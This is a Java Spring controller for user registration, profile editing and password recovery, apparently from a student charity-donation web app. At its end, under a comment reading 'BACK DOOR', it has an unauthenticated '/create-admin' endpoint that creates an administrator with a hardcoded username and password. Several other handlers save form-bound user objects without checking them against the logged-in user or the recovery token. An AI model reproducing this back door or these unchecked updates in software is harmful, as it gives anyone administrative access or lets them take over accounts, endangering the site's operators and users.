package pl.coderslab.charity.controller;

import lombok.RequiredArgsConstructor;
import org.springframework.security.core.annotation.AuthenticationPrincipal;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.validation.BindingResult;
import org.springframework.web.bind.annotation.*;
import pl.coderslab.charity.entity.Token;
import pl.coderslab.charity.entity.User;
import pl.coderslab.charity.service.*;

import javax.validation.Valid;
import java.util.Optional;

@RequiredArgsConstructor
@Controller
public class UserController {

    private final UserService userService;
    private final TokenService tokenService;
    private final UserRegister userRegister;
    private final UserPasswordRecoveryService userPassRecoveryService;

    @GetMapping("/user/profile")
    public String startPage(Model model, @AuthenticationPrincipal CurrentUser currentUser){
        model.addAttribute("user", userService.findByUserName(currentUser.getUsername()));
        return "user/profile";
    }

    @GetMapping("/register")
    private String showRegisterForm(Model model){
        model.addAttribute("user", new User());
        return "/register/register";
    }

    @PostMapping("/register")
    private String proceedRegisterForm(@Valid User user, BindingResult result){
        if(result.hasErrors() || userService.usernameRepetitionFound(user)){
            return "/register/register";
        }
        userRegister.saveNotRegisteredUser(user);
        return "/register/register-mail-sent";
    }

    @GetMapping("/register/uuid/{token}")
    private String showRegisterConfirmation(@PathVariable String token){
        Token tokenDB = tokenService.findByToken(token);
        if(tokenDB!=null && tokenDB.getToken().equals(token)){
            userRegister.register(tokenDB.getUser());
            return "/register/register-success";
        }
        return "/error";
    }


    @GetMapping("/user/edit")
    private String showUserEditForm(@AuthenticationPrincipal CurrentUser currentUser, Model model){
        model.addAttribute("user", userService.findByUserName(currentUser.getUsername()));
        return "user/edit";
    }

    @PostMapping("/user/edit")
    private String proceedUserEditForm(@Valid User user, BindingResult result){

        if (userService.usernameRepetitionFound(user) || result.hasErrors()){
            return "user/edit";
        }
        userService.save(user);
        return "redirect:/";
    }

    @GetMapping("/user/password/edit")
    private String showUserPasswordEditForm(@AuthenticationPrincipal CurrentUser currentUser, Model model){
        User user = userService.findByUserName(currentUser.getUsername());
        user.setPassword("");
        model.addAttribute("user", user);
        return "user/password-edit";
    }

    @PostMapping("/user/password/edit")
    private String proceedUserPasswordEditForm(@Valid User user, BindingResult result){
        if (!result.hasErrors()){
            userService.changePassword(user);
            return "redirect:/";
        }
        return "user/password-edit";
    }

    @GetMapping("/password-recovery")
    public String showPasswordRecoveryForm(){
        return "/password-recovery/get-mail";
    }

    @PostMapping("/password-recovery")
    public String processPasswordRecoveryForm(@RequestParam String email){
        User user = userService.findByUserName(email);
        if (user!=null){
            userPassRecoveryService.passwordRecover(user);
            return "/password-recovery/mail-sent";
        }
        return "password-recovery/unknown-mail";
    }

    @GetMapping("/password-recovery/uuid/{code}")
    public String showPasswordForm(Model model, @PathVariable String code){
        Token token = tokenService.findByToken(code);
        if(token!=null && token.getToken().equals(code)){
            model.addAttribute("user", token.getUser());
            return "/password-recovery/set";
        }
        return "/error";
    }

    @PostMapping("/password-recovery/uuid/{code}")
    public String processPasswordForm(@Valid User user, BindingResult result){
        if (result.hasErrors()){
            return "/password-recovery/set";
        }
        userPassRecoveryService.editPassword(user);
        return "/password-recovery/confirmed";
    }

   // BACK DOOR BACK DOOR BACK DOOR

    @GetMapping("/create-admin")
    @ResponseBody
    public String createUser() {
        User user = new User();
        user.setUsername("admin3@outlook.com");
        user.setPassword("admin3");
        user.setLastname("admin3");
        user.setName("admin3");

        userService.saveAdmin(user);
        return "admin";
    }

}
